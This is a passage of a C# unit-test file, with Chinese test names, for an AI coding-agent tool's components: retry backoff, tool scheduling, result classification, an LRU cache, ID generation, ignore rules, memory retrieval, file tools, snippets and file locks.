        }, new RetryConfig { MaxRetries = 3, BaseDelayMs = 1, MaxDelayMs = 10 })
            .GetAwaiter().GetResult();
        Check("Retry: 失败 2 次后成功", ok2 == 42 && attempts2 == 3);

        // ── RetryAsync：耗尽重试原样抛出最后一次异常（非 AggregateException）──
        var attempts3 = 0;
        var threw = false;
        try
        {
            RetryPolicy.RetryAsync<int>(() => { attempts3++; throw new IOException("一直失败"); },
                new RetryConfig { MaxRetries = 2, BaseDelayMs = 1, MaxDelayMs = 10 })
                .GetAwaiter().GetResult();
        }
        catch (IOException) { threw = true; }
        Check("Retry: 耗尽重试原样抛出最后一次异常", threw);
        Check("Retry: 耗尽后尝试次数 = MaxRetries+1", attempts3 == 3);

        // ── 指数退避：延迟 100→200→400 递增（禁用 jitter 以确定性断言）──
        var delays = new List<int>();
        try
        {
            RetryPolicy.RetryAsync<int>(() => { throw new IOException("x"); },
                new RetryConfig { MaxRetries = 3, BaseDelayMs = 100, MaxDelayMs = 5000, JitterRatio = 0 },
                (_, _, delay) => delays.Add(delay))
                .GetAwaiter().GetResult();
        }
        catch { }
        Check("Retry: 指数退避 100→200→400", delays.SequenceEqual(new[] { 100, 200, 400 }));

        // ── 对称 jitter：延迟在 ±ratio 范围内抖动（纯函数断言）──
        Check("Retry: jitter 下限 -10%", RetryPolicy.ComputeJitteredDelay(100, 0.1, 0.0) == 90);
        Check("Retry: jitter 中点不变", RetryPolicy.ComputeJitteredDelay(100, 0.1, 0.5) == 100);
        Check("Retry: jitter 上限 +10%", RetryPolicy.ComputeJitteredDelay(100, 0.1, 1.0) == 110);
        Check("Retry: jitter 0 禁用", RetryPolicy.ComputeJitteredDelay(100, 0.0, 0.3) == 100);
        Check("Retry: jitter 负值禁用", RetryPolicy.ComputeJitteredDelay(100, -0.2, 0.3) == 100);
        // 实际重试应产生非确定延迟（在 ±10% 范围内）
        var jitterDelays = new List<int>();
        try
        {
            RetryPolicy.RetryAsync<int>(() => { throw new IOException("x"); },
                new RetryConfig { MaxRetries = 3, BaseDelayMs = 100, MaxDelayMs = 5000, JitterRatio = 0.1 },
                (_, _, delay) => jitterDelays.Add(delay))
                .GetAwaiter().GetResult();
        }
        catch { }
        Check("Retry: jitter 实际延迟在 ±10% 内",
            jitterDelays.Count == 3 &&
            Math.Abs(jitterDelays[0] - 100) <= 10 &&
            Math.Abs(jitterDelays[1] - 200) <= 20 &&
            Math.Abs(jitterDelays[2] - 400) <= 40);

        // ── 无返回值版本 ──
        var ran = false;
        RetryPolicy.RetryAsync(async () => { ran = true; await Task.CompletedTask; }).GetAwaiter().GetResult();
        Check("Retry: 无返回值版本执行", ran);
    }

    /// <summary>工具调用调度器（ToolCallScheduler）：ExecutionMode 分批 + 有界并发 + 工具模式标注。</summary>
    private static void TestToolScheduler(Action<string, bool> Check)
    {
        static ToolCall C(string id, string name) => new(id, name, new Dictionary<string, object?>());

        ToolExecutionMode Mode(string name) =>
            name is "bash" or "write_file" or "edit_file" ? ToolExecutionMode.Exclusive
            : ToolExecutionMode.Parallel;

        // ── Partition 纯逻辑 ──
        var allParallel = new List<ToolCall> { C("1", "read_file"), C("2", "grep"), C("3", "glob") };
        var pAll = ToolCallScheduler.Partition(allParallel, Mode);
        Check("Sched: 全 Parallel 合并为一批", pAll.Count == 1 && pAll[0].Count == 3);

        var allExclusive = new List<ToolCall> { C("1", "bash"), C("2", "write_file") };
        var pExcl = ToolCallScheduler.Partition(allExclusive, Mode);
        Check("Sched: 全 Exclusive 各占一批", pExcl.Count == 2 && pExcl.All(b => b.Count == 1));

        var mixed = new List<ToolCall>
        {
            C("1", "read_file"), C("2", "grep"),
            C("3", "bash"),
            C("4", "read_file"),
            C("5", "edit_file"),
            C("6", "glob"), C("7", "ls"),
        };
        var pMixed = ToolCallScheduler.Partition(mixed, Mode);
        Check("Sched: 混合分批 [[P,P],[E],[P],[E],[P,P]]",
            pMixed.Count == 5 &&
            pMixed[0].Count == 2 && pMixed[0][0].Id == "1" && pMixed[0][1].Id == "2" &&
            pMixed[1].Count == 1 && pMixed[1][0].Id == "3" &&
            pMixed[2].Count == 1 && pMixed[2][0].Id == "4" &&
            pMixed[3].Count == 1 && pMixed[3][0].Id == "5" &&
            pMixed[4].Count == 2 && pMixed[4][0].Id == "6" && pMixed[4][1].Id == "7");

        Check("Sched: 空列表返回空批次", ToolCallScheduler.Partition(new List<ToolCall>(), Mode).Count == 0);

        // 未知工具由调用方 GetExecutionMode 保守按 Exclusive 处理（此处用显式 modeOf 模拟）
        var unknown = new List<ToolCall> { C("1", "nosuch_tool"), C("2", "read_file") };
        var pUnknown = ToolCallScheduler.Partition(unknown,
            n => n == "nosuch_tool" ? ToolExecutionMode.Exclusive : ToolExecutionMode.Parallel);
        Check("Sched: 未知工具保守 Exclusive 独占", pUnknown.Count == 2 && pUnknown[0].Count == 1);

        // ── 有界并发常量 ──
        Check("Sched: 并发上限 1..16", ToolCallScheduler.MaxParallelism > 0 && ToolCallScheduler.MaxParallelism <= 16);

        // ── 实际工具 ExecutionMode 标注 ──
        Check("Sched: bash Exclusive", ToolRegistry.GetTool("bash")!.ExecutionMode == ToolExecutionMode.Exclusive);
        Check("Sched: write_file Exclusive", ToolRegistry.GetTool("write_file")!.ExecutionMode == ToolExecutionMode.Exclusive);
        Check("Sched: edit_file Exclusive", ToolRegistry.GetTool("edit_file")!.ExecutionMode == ToolExecutionMode.Exclusive);
        Check("Sched: agent Exclusive", ToolRegistry.GetTool("agent")!.ExecutionMode == ToolExecutionMode.Exclusive);
        Check("Sched: lsp Exclusive", ToolRegistry.GetTool("lsp")!.ExecutionMode == ToolExecutionMode.Exclusive);
        Check("Sched: read_file Parallel", ToolRegistry.GetTool("read_file")!.ExecutionMode == ToolExecutionMode.Parallel);
        Check("Sched: grep Parallel", ToolRegistry.GetTool("grep")!.ExecutionMode == ToolExecutionMode.Parallel);
        Check("Sched: glob Parallel", ToolRegistry.GetTool("glob")!.ExecutionMode == ToolExecutionMode.Parallel);
        Check("Sched: web_search Parallel", ToolRegistry.GetTool("web_search")!.ExecutionMode == ToolExecutionMode.Parallel);
    }

    /// <summary>工具结果分类器（ToolResultClassifier）：真实错误 vs 用户取消/安全阻止。</summary>
    private static void TestToolResultClassifier(Action<string, bool> Check)
    {
        // ── 真实错误（可重试，注入自恢复提示）──
        Check("Cls: 错误 全角冒号", ToolResultClassifier.IsError("错误：文件不存在"));
        Check("Cls: 错误 半角冒号", ToolResultClassifier.IsError("错误: 参数缺失"));
        Check("Cls: Error 英文", ToolResultClassifier.IsError("Error: permission denied"));
        Check("Cls: ❌ 失败", ToolResultClassifier.IsError("❌ 测试失败（exit 1）"));
        Check("Cls: ❌ 文件锁定", ToolResultClassifier.IsError("❌ 文件被锁定: 忙"));
        Check("Cls: bash 出错", ToolResultClassifier.IsError("运行命令时出错：IOException"));
        Check("Cls: 失败 前缀", ToolResultClassifier.IsError("失败：编译错误"));
        Check("Cls: 前导空白仍识别", ToolResultClassifier.IsError("  错误：x"));

        // ── 中止类（非错误，不注入重试提示）──
        Check("Cls: 用户取消非错误", !ToolResultClassifier.IsError("用户取消了此操作。"));
        Check("Cls: Hook 阻止非错误", !ToolResultClassifier.IsError("操作被 Hook 阻止: 政策"));
        Check("Cls: 危险命令阻止非错误", !ToolResultClassifier.IsError("⚠ 已阻止：强制递归删除"));
        Check("Cls: 沙箱阻止非错误", !ToolResultClassifier.IsError("⛔ 沙箱阻止：越界"));
        Check("Cls: 取消是中止", ToolResultClassifier.IsAbort("用户取消了此操作。"));

        // ── 成功/正常结果（非错误）──
        Check("Cls: 成功非错误", !ToolResultClassifier.IsError("已写入 12 行到 /tmp/a.cs"));
        Check("Cls: 空非错误", !ToolResultClassifier.IsError(null));
        Check("Cls: 空白非错误", !ToolResultClassifier.IsError("   "));
        Check("Cls: 无输出非错误", !ToolResultClassifier.IsError("（无输出）"));
    }

    /// <summary>LRU 缓存（LruCache）单元测试：容量淘汰、LRU 提升、TTL 过期、事件与统计。</summary>
    private static void TestLruCache(Action<string, bool> Check)
    {
        // ── 基本 Put/Get + 命中统计 ──
        var cache = new LruCache<string, int>(3);
        cache.Put("a", 1);
        cache.Put("b", 2);
        Check("LRU: 基本 Get", cache.Get("a") == 1 && cache.Get("b") == 2);
        Check("LRU: 未命中返回默认", cache.Get("missing") == 0);
        Check("LRU: 命中/未命中统计", cache.Hits == 2 && cache.Misses == 1);

        // ── 容量淘汰（淘汰最久未使用）──
        var cache2 = new LruCache<string, int>(2);
        cache2.Put("a", 1);
        cache2.Put("b", 2);
        cache2.Put("c", 3); // 淘汰 a
        Check("LRU: 容量淘汰最旧",
            !cache2.ContainsKey("a") && cache2.ContainsKey("b") && cache2.ContainsKey("c"));
        Check("LRU: 淘汰计数", cache2.Evictions == 1);

        // ── Get 提升 LRU（最近使用不被淘汰）──
        var cache3 = new LruCache<string, int>(2);
        cache3.Put("a", 1);
        cache3.Put("b", 2);
        cache3.Get("a");     // 提升 a 为最近使用
        cache3.Put("c", 3);  // 淘汰 b（而非 a）
        Check("LRU: Get 提升最近使用",
            cache3.ContainsKey("a") && !cache3.ContainsKey("b") && cache3.ContainsKey("c"));

        // ── TTL 过期 ──
        var cache4 = new LruCache<string, int>(3);
        cache4.Put("a", 1, TimeSpan.FromMilliseconds(1));
        System.Threading.Thread.Sleep(20);
        Check("LRU: TTL 过期后 Get 返回默认", cache4.Get("a") == 0);
        Check("LRU: TTL 过期后 ContainsKey false", !cache4.ContainsKey("a"));

        // ── Remove / Clear / OnEvicted 事件 ──
        var evicted = new List<string>();
        var cache5 = new LruCache<string, int>(3);
        cache5.OnEvicted += (k, _) => evicted.Add(k);
        cache5.Put("a", 1);
        cache5.Put("b", 2);
        Check("LRU: Remove 返回 true", cache5.Remove("a"));
        Check("LRU: Remove 不存在的键返回 false", !cache5.Remove("zzz"));
        Check("LRU: Remove 触发 OnEvicted", evicted.Contains("a"));
        cache5.Clear();
        Check("LRU: Clear 清空", cache5.Count == 0);
        Check("LRU: Clear 触发 OnEvicted", evicted.Contains("b"));

        // ── TryGet ──
        var cache6 = new LruCache<string, int>(2);
        cache6.Put("a", 42);
        Check("LRU: TryGet 命中", cache6.TryGet("a", out var v) && v == 42);
        Check("LRU: TryGet 未命中", !cache6.TryGet("missing", out _));

        // ── 容量 ≤0 抛异常 ──
        var threwCap = false;
        try { new LruCache<string, int>(0); } catch (ArgumentOutOfRangeException) { threwCap = true; }
        Check("LRU: 容量 ≤0 抛异常", threwCap);
    }

    /// <summary>短 ID 生成器（IdGenerator）单元测试：字符集、唯一性、slug 格式。</summary>
    private static void TestIdGenerator(Action<string, bool> Check)
    {
        // ── NewId 长度 + 安全字符集 ──
        var id = IdGenerator.NewId(8);
        Check("ID: NewId 长度", id.Length == 8);
        const string safe = "abcdefghjkmnpqrstuvwxyz23456789";
        Check("ID: NewId 字符集安全（无 0/o/1/l/i）", id.All(safe.Contains));

        // ── NewId 唯一性 ──
        var ids = new HashSet<string>();
        for (int i = 0; i < 100; i++) ids.Add(IdGenerator.NewId());
        Check("ID: 100 个 NewId 无重复", ids.Count == 100);

        // ── 长度参数与校验 ──
        Check("ID: NewId 默认长度 8", IdGenerator.NewId().Length == 8);
        Check("ID: NewId 自定义长度 16", IdGenerator.NewId(16).Length == 16);
        var threwLen = false;
        try { IdGenerator.NewId(0); } catch (ArgumentOutOfRangeException) { threwLen = true; }
        Check("ID: NewId 长度 ≤0 抛异常", threwLen);

        // ── NewSlug 格式（形容词-动物-名词）──
        var slug = IdGenerator.NewSlug(3);
        var parts = slug.Split('-');
        Check("ID: NewSlug 3 段", parts.Length == 3);
        Check("ID: NewSlug 全小写字母", slug.All(c => char.IsLower(c) || c == '-'));

        // ── NewSlug 词数 clamp ──
        Check("ID: NewSlug 默认 3 词", IdGenerator.NewSlug().Split('-').Length == 3);
        Check("ID: NewSlug 1 词", IdGenerator.NewSlug(1).Split('-').Length == 1);
        Check("ID: NewSlug 超上限 clamp 到 5", IdGenerator.NewSlug(99).Split('-').Length == 5);
        Check("ID: NewSlug 0 clamp 到 1", IdGenerator.NewSlug(0).Split('-').Length == 1);

        // ── NewPrefixed ──
        var prefixed = IdGenerator.NewPrefixed("wf");
        Check("ID: NewPrefixed 前缀", prefixed.StartsWith("wf_"));
        Check("ID: NewPrefixed 长度 = 前缀+1+6", prefixed.Length == "wf".Length + 1 + 6);
    }

    /// <summary>文件忽略规则（FileIgnoreManager）单元测试：静态忽略 + glob 规则匹配 + 否定/锚定。</summary>
    private static void TestFileIgnoreManager(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_ignore_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        try
        {
            // ── 静态忽略（无规则文件，纯 AlwaysIgnore 逻辑）──
            Check("Ignore: node_modules 目录始终忽略",
                FileIgnoreManager.IsIgnored("node_modules/foo.cs", tmp));
            Check("Ignore: dist 目录始终忽略",
                FileIgnoreManager.IsIgnored("dist/app.js", tmp));
            Check("Ignore: .git 目录始终忽略",
                FileIgnoreManager.IsIgnored(".git/HEAD", tmp));
            Check("Ignore: .pyc 扩展名始终忽略",
                FileIgnoreManager.IsIgnored("foo.pyc", tmp));
            Check("Ignore: .dll 扩展名始终忽略",
                FileIgnoreManager.IsIgnored("lib/foo.dll", tmp));
            Check("Ignore: .jpg 扩展名始终忽略",
                FileIgnoreManager.IsIgnored("image.jpg", tmp));
            Check("Ignore: 正常源文件不忽略",
                !FileIgnoreManager.IsIgnored("src/main.cs", tmp));
            Check("Ignore: README 不忽略",
                !FileIgnoreManager.IsIgnored("README.md", tmp));

            // ── 写 .gitignore 规则，测试 glob 匹配 ──
            File.WriteAllText(Path.Combine(tmp, ".gitignore"),
                "# 测试规则\n*.log\nbuild/\n/rootfile.txt\n*.tmp\n!important.log\n");
            FileIgnoreManager.ClearCache();

            Check("Ignore: *.log 匹配任意深度",
                FileIgnoreManager.IsIgnored("app.log", tmp)
                && FileIgnoreManager.IsIgnored("src/deep/app.log", tmp));
            Check("Ignore: 否定规则 !important.log 反转忽略",
                !FileIgnoreManager.IsIgnored("important.log", tmp));
            Check("Ignore: build/ 目录规则匹配",
                FileIgnoreManager.IsIgnored("build/output.txt", tmp));
            Check("Ignore: 锚定 /rootfile.txt 仅匹配根目录",
                FileIgnoreManager.IsIgnored("rootfile.txt", tmp)
                && !FileIgnoreManager.IsIgnored("sub/rootfile.txt", tmp));
            Check("Ignore: *.tmp 扩展名规则匹配",
                FileIgnoreManager.IsIgnored("notes.txt.tmp", tmp));
            Check("Ignore: 未命中规则的文件不忽略",
                !FileIgnoreManager.IsIgnored("main.cs", tmp));

            // ── FilterIgnored 批量过滤 ──
            var kept = FileIgnoreManager.FilterIgnored(
                new[] { "a.cs", "node_modules/x.js", "b.log", "c.pyc", "d.jpg" }, tmp);
            Check("Ignore: FilterIgnored 仅保留非忽略项",
                kept.Count == 1 && kept[0] == "a.cs");

            // ── ShouldSkipDirectory 目录跳过 ──
            Check("Ignore: 跳过 .git 目录",
                FileIgnoreManager.ShouldSkipDirectory(".git", tmp));
            Check("Ignore: 跳过 node_modules 目录",
                FileIgnoreManager.ShouldSkipDirectory("node_modules", tmp));
            Check("Ignore: 跳过隐藏目录 .hidden",
                FileIgnoreManager.ShouldSkipDirectory(".hidden", tmp));
            Check("Ignore: 跳过 build 目录",
                FileIgnoreManager.ShouldSkipDirectory("build", tmp));
            Check("Ignore: 不跳过普通目录 src",
                !FileIgnoreManager.ShouldSkipDirectory("src", tmp));
        }
        finally
        {
            FileIgnoreManager.ClearCache();
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>跨会话记忆检索（MemoryRetrieval）单元测试：关键词匹配打分 + 提示词格式化。</summary>
    private static void TestMemoryRetrieval(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_mem_" + Guid.NewGuid().ToString("N")[..6]);
        var memDir = Path.Combine(tmp, ".waycoder", "memory");
        Directory.CreateDirectory(memDir);
        try
        {
            // 写两个 frontmatter 记忆文件
            File.WriteAllText(Path.Combine(memDir, "timeseries-notes.md"),
                "---\nname: timeseries-notes\ndescription: TimeSeries 时序预测模块的实现要点\n---\n时序预测用指数平滑。\n");
            File.WriteAllText(Path.Combine(memDir, "automata-notes.md"),
                "---\nname: automata-notes\ndescription: Automata 状态机的构建方法\ntype: project\n---\n状态机用 DFA 表示。\n");

            MemoryRetrieval.Load(tmp);

            // ── GetRelevant 关键词匹配 ──
            var rel = MemoryRetrieval.GetRelevant("给 TimeSeries 模块加冒烟测试", maxResults: 3);
            Check("Memory: GetRelevant 命中 TimeSeries 记忆",
                rel.Any(m => m.Name == "timeseries-notes"));

            var rel2 = MemoryRetrieval.GetRelevant("Automata 状态机怎么建", maxResults: 3);
            Check("Memory: GetRelevant 命中 Automata 记忆",
                rel2.Any(m => m.Name == "automata-notes"));

            var rel3 = MemoryRetrieval.GetRelevant("完全无关的 XYZQWERTY 话题", maxResults: 3);
            Check("Memory: 无关关键词不命中已索引记忆",
                rel3.All(m => m.Name != "timeseries-notes" && m.Name != "automata-notes"));

            // ── FormatForPrompt 格式化 ──
            var fmt = MemoryRetrieval.FormatForPrompt(rel);
            Check("Memory: FormatForPrompt 含标题", fmt.Contains("相关记忆"));
            Check("Memory: FormatForPrompt 含记忆名与类型",
                fmt.Contains("timeseries-notes") && fmt.Contains("reference"));

            // 描述超 200 字符截断
            var longItem = new MemoryRetrieval.MemoryItem(
                "long-desc", new string('x', 250), "content", "ref", DateTime.UtcNow);
            var fmt2 = MemoryRetrieval.FormatForPrompt(new[] { longItem });
            Check("Memory: 描述超 200 截断为 …", fmt2.Contains(new string('x', 200) + "..."));

            // 空列表返回空
            Check("Memory: FormatForPrompt 空列表返回空",
                MemoryRetrieval.FormatForPrompt(new List<MemoryRetrieval.MemoryItem>()) == "");
        }
        finally
        {
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>查找替换工具（FindReplaceTool）单元测试：预览/替换、无效正则回退、错误分支。</summary>
    private static void TestFindReplaceTool(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_fr_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        var tool = new FindReplaceTool();
        try
        {
            var file = Path.Combine(tmp, "sample.cs");
            File.WriteAllText(file, "int foo = 1;\nvar foo2 = foo + 1;\n");

            // 空 pattern 报错
            var r0 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["pattern"] = "" }).GetAwaiter().GetResult();
            Check("FindReplace: 空 pattern 报错", r0.Contains("pattern 参数不能为空"));

            // 预览模式（不写文件）
            var r1 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["pattern"] = "foo", ["replacement"] = "bar", ["dry_run"] = true
            }).GetAwaiter().GetResult();
            Check("FindReplace: 预览输出匹配详情", r1.Contains("foo") && r1.Contains("预览"));
            Check("FindReplace: 预览不写文件", File.ReadAllText(file).Contains("foo"));

            // 实际替换
            var r2 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["pattern"] = "foo", ["replacement"] = "bar", ["dry_run"] = false
            }).GetAwaiter().GetResult();
            var replaced = File.ReadAllText(file);
            Check("FindReplace: 实际替换写入", !replaced.Contains("foo") && replaced.Contains("bar"));

            // 无效正则回退为纯文本匹配
            File.WriteAllText(Path.Combine(tmp, "arr.cs"), "var x = arr[0];\n");
            var r3 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["pattern"] = "[", ["dry_run"] = true
            }).GetAwaiter().GetResult();
            Check("FindReplace: 无效正则回退纯文本匹配", r3.Contains("arr"));

            // 目录不存在报错
            var r4 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = Path.Combine(tmp, "nope"), ["pattern"] = "foo"
            }).GetAwaiter().GetResult();
            Check("FindReplace: 目录不存在报错", r4.Contains("目录不存在"));
        }
        finally
        {
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>文件差异对比工具（DiffTool）单元测试：差异行/相同/空文件/不存在。</summary>
    private static void TestDiffTool(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_diff_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        var tool = new DiffTool();
        try
        {
            var f1 = Path.Combine(tmp, "a.txt");
            var f2 = Path.Combine(tmp, "b.txt");
            File.WriteAllText(f1, "line1\nline2\nline3\n");
            File.WriteAllText(f2, "line1\nCHANGED\nline3\n");

            // 差异输出
            var r = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["file1"] = f1, ["file2"] = f2 }).GetAwaiter().GetResult();
            Check("Diff: 差异输出含删除行", r.Contains("- 2: line2"));
            Check("Diff: 差异输出含新增行", r.Contains("+ 2: CHANGED"));

            // 相同文件
            var r2 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["file1"] = f1, ["file2"] = f1 }).GetAwaiter().GetResult();
            Check("Diff: 相同文件提示", r2.Contains("内容相同"));

            // 空文件
            var empty = Path.Combine(tmp, "empty.txt");
            File.WriteAllText(empty, "");
            var r3 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["file1"] = empty, ["file2"] = empty }).GetAwaiter().GetResult();
            Check("Diff: 空文件提示", r3.Contains("均为空"));

            // 文件不存在
            var r4 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["file1"] = Path.Combine(tmp, "nope.txt"), ["file2"] = f2 }).GetAwaiter().GetResult();
            Check("Diff: 文件不存在错误", r4.Contains("文件不存在"));
        }
        finally
        {
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>目录树工具（TreeTool）单元测试：树生成/深度/隐藏跳过/错误分支。</summary>
    private static void TestTreeTool(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_tree_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        var tool = new TreeTool();
        try
        {
            var sub = Path.Combine(tmp, "sub");
            Directory.CreateDirectory(sub);
            File.WriteAllText(Path.Combine(tmp, "a.txt"), "x");
            File.WriteAllText(Path.Combine(sub, "b.cs"), "y");
            File.WriteAllText(Path.Combine(tmp, ".hidden"), "z");

            // 树生成
            var r = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["depth"] = 3, ["max"] = 100 }).GetAwaiter().GetResult();
            Check("Tree: 输出含子目录", r.Contains("sub"));
            Check("Tree: 输出含文件", r.Contains("a.txt") && r.Contains("b.cs"));
            Check("Tree: 隐藏文件跳过", !r.Contains(".hidden"));

            // 目录不存在
            var r2 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = Path.Combine(tmp, "nope") }).GetAwaiter().GetResult();
            Check("Tree: 目录不存在错误", r2.Contains("目录不存在"));

            // 深度限制（depth=1 不递归子目录内容）
            var r3 = tool.ExecuteAsync(new Dictionary<string, object?> {
                ["path"] = tmp, ["depth"] = 1, ["max"] = 100 }).GetAwaiter().GetResult();
            Check("Tree: 深度限制不展开子目录", !r3.Contains("b.cs"));
        }
        finally
        {
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>代码片段管理（SnippetStore）单元测试：frontmatter 解析 + 增删查/多词搜索。</summary>
    private static void TestSnippetStore(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_snip_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        try
        {
            // 1. 预写 frontmatter 片段，测 Load 解析
            File.WriteAllText(Path.Combine(tmp, "parsed-snippet.md"),
                "---\nname: parsed-snippet\nlanguage: python\ntags: [ml, data]\n---\ndef predict():\n    return 1\n");
            SnippetStore.Load(tmp);
            Check("Snippet: frontmatter 解析 name/body",
                SnippetStore.Get("parsed-snippet", tmp)?.Contains("def predict") == true);

            // 2. Add → Get 往返
            SnippetStore.Add("hello-world", "Console.WriteLine(\"hi\");", "csharp",
                new List<string> { "utility" }, tmp);
            Check("Snippet: Add 后 Get 返回内容",
                SnippetStore.Get("hello-world", tmp)?.Contains("Console.WriteLine") == true);

            // 3. Search 多词 OR
            SnippetStore.Add("string-utils", "static string Trim() {}", "csharp",
                new List<string> { "string", "utility" }, tmp);
            Check("Snippet: Search 按名称命中",
                SnippetStore.Search("string", tmp).Any(s => s.Name == "string-utils"));
            Check("Snippet: Search 命中多个含 utility 标签",
                SnippetStore.Search("utility", tmp).Count >= 2);
            Check("Snippet: Search 无命中返回空",
                SnippetStore.Search("zzz_none", tmp).Count == 0);

            // 4. List
            Check("Snippet: List 含所有片段",
                SnippetStore.List(tmp).Any(s => s.Name == "hello-world"));

            // 5. Delete
            Check("Snippet: Delete 返回 true", SnippetStore.Delete("hello-world", tmp));
            Check("Snippet: Delete 后 Get 返回 null", SnippetStore.Get("hello-world", tmp) == null);
            Check("Snippet: Delete 不存在返回 false", !SnippetStore.Delete("nope", tmp));
        }
        finally
        {
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>
    /// 导入助手（ImportHelper）纯逻辑单元测试：JSONC 注释剥离（行/块/字符串内转义）+
    /// 文件大小格式化（B/KB/MB 三档 + 边界）。
    /// 这些方法原先 private，改为 internal 后成为可测的零依赖纯函数。
    /// </summary>
    private static void TestImportHelper(Action<string, bool> Check)
    {
        // ---- StripJsonComments：行注释 ----
        var noLine = ImportHelper.StripJsonComments("{\"a\": 1} // 行注释");
        Check("Import: 行注释移除", !noLine.Contains("行注释"));
        Check("Import: 行注释后仍可解析", Json.Parse(noLine) is JNode { Kind: JKind.Object });

        // ---- StripJsonComments：块注释 ----
        var noBlock = ImportHelper.StripJsonComments("{\"a\": /* 块注释 */ 1}");
        Check("Import: 块注释移除", !noBlock.Contains("块注释"));
        Check("Import: 块注释后字段值正确", (int?)Json.Parse(noBlock)?["a"]?.AsNumber() == 1);

        // ---- StripJsonComments：字符串内注释标记不误删 ----
        var url = ImportHelper.StripJsonComments("{\"url\": \"http://example.com\"}");
        Check("Import: 字符串内 // 不误删", url.Contains("http://example.com"));

        var star = ImportHelper.StripJsonComments("{\"s\": \"a/*b*/c\"}");
        Check("Import: 字符串内 /* */ 不误删", star.Contains("a/*b*/c"));

        // ---- StripJsonComments：字符串内转义引号不破坏解析 ----
        var esc = ImportHelper.StripJsonComments("{\"s\": \"a\\\"b\"}");
        Check("Import: 转义引号保留", Json.Parse(esc)?["s"]?.AsString() == "a\"b");

        // ---- FormatSize：三档 + 边界 ----
        Check("Import: FormatSize 0 B", ImportHelper.FormatSize(0) == "0 B");
        Check("Import: FormatSize 512 B", ImportHelper.FormatSize(512) == "512 B");
        Check("Import: FormatSize 1023 B 边界", ImportHelper.FormatSize(1023) == "1023 B");
        Check("Import: FormatSize 1KB 边界", ImportHelper.FormatSize(1024) == "1.0 KB");
        Check("Import: FormatSize 2KB", ImportHelper.FormatSize(2048) == "2.0 KB");
        Check("Import: FormatSize 1MB 边界", ImportHelper.FormatSize(1024L * 1024) == "1.0 MB");
        Check("Import: FormatSize 5MB", ImportHelper.FormatSize(5L * 1024 * 1024) == "5.0 MB");
    }

    /// <summary>文件锁管理器（FileLockManager）单元测试：获取/续期/拒绝/过期强占/释放/等待。</summary>
    private static void TestFileLockManager(Action<string, bool> Check)
    {
        var path = Path.Combine(Path.GetTempPath(), "wc_lock_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        var agentA = "agent-a";
        var agentB = "agent-b";

        // 清理残留
        FileLockManager.ReleaseAll(agentA);
        FileLockManager.ReleaseAll(agentB);

        // 1. 首次获取成功 + 锁信息
        Check("FileLock: 首次获取成功", FileLockManager.TryAcquire(path, agentA));
        Check("FileLock: 获取后有锁信息", FileLockManager.GetLockInfo(path) != null);
        Check("FileLock: 锁持有者正确", FileLockManager.GetLockInfo(path)?.AgentId == agentA);

        // 2. 同 agent 续期成功
        Check("FileLock: 同 agent 续期成功", FileLockManager.TryAcquire(path, agentA));

        // 3. 不同 agent 被拒 + IsLockedByOther
        Check("FileLock: 不同 agent 被拒", !FileLockManager.TryAcquire(path, agentB));
        Check("FileLock: IsLockedByOther 判定", FileLockManager.IsLockedByOther(path, agentB));
        Check("FileLock: 本人不视为其他", !FileLockManager.IsLockedByOther(path, agentA));

        // 4. Release 后其他 agent 可获取
        FileLockManager.Release(path, agentA);
        Check("FileLock: Release 后可被其他获取", FileLockManager.TryAcquire(path, agentB));
        FileLockManager.Release(path, agentB);

        // 5. 不同 agent 释放无效（锁归属不匹配）
        FileLockManager.TryAcquire(path, agentA);
        FileLockManager.Release(path, agentB);
        Check("FileLock: 不同 agent 释放无效", FileLockManager.GetLockInfo(path)?.AgentId == agentA);

        // 6. 过期锁被其他 agent 强制获取（timeout 为负 → 立即过期）
        FileLockManager.Release(path, agentA);
        FileLockManager.TryAcquire(path, agentA, TimeSpan.FromMilliseconds(-1));
        Check("FileLock: 过期锁被其他强占", FileLockManager.TryAcquire(path, agentB));
        FileLockManager.Release(path, agentB);

        // 7. ReleaseAll 释放指定 agent 全部锁
        FileLockManager.TryAcquire(path, agentA);
        FileLockManager.TryAcquire(path + ".2", agentA);
        FileLockManager.ReleaseAll(agentA);
        Check("FileLock: ReleaseAll 清空", FileLockManager.GetAllLocks().Count == 0);

        // 8. GetSummary 空/非空
        Check("FileLock: 无锁摘要为空", FileLockManager.GetSummary() == "");
        FileLockManager.TryAcquire(path, agentA);
        Check("FileLock: 有锁摘要非空", FileLockManager.GetSummary().Contains("文件锁定"));
        FileLockManager.ReleaseAll(agentA);

        // 9. WaitForLockAsync 无锁立即成功
